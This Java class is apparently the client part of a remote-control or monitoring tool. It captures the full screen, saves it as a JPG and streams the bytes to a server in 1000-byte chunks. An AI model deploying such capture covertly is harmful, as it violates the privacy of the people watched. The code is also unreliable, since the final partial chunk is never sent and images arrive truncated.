package ch.lebois.client.service;

import ch.lebois.client.handler.ResponseSender;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.Date;

public class ImageService {

    public File takeScreenshot() {
        File file = new File(String.valueOf(new Date().getTime()) + ".jpg");
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);

            ImageIO.write(screenFullImage, "jpg", file);
        } catch (AWTException | IOException ignored) {
            System.out.println("Error with Screenshot");
        }
        return file;
    }

    public void sendImgBytes(File file) {
        try {
            byte[] fileContent = Files.readAllBytes(file.toPath());
            StringBuilder tempBytes = new StringBuilder();
            int counter = 0;
            for (byte b : fileContent) {
                counter++;
                tempBytes.append(b + "\n");
                if (counter == 1000) {
                    new ResponseSender("imgbytes", tempBytes.toString());
                    tempBytes = new StringBuilder();
                    counter = 0;
                }

            }
            new ResponseSender("imgend", "");
            new ResponseSender().reset();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
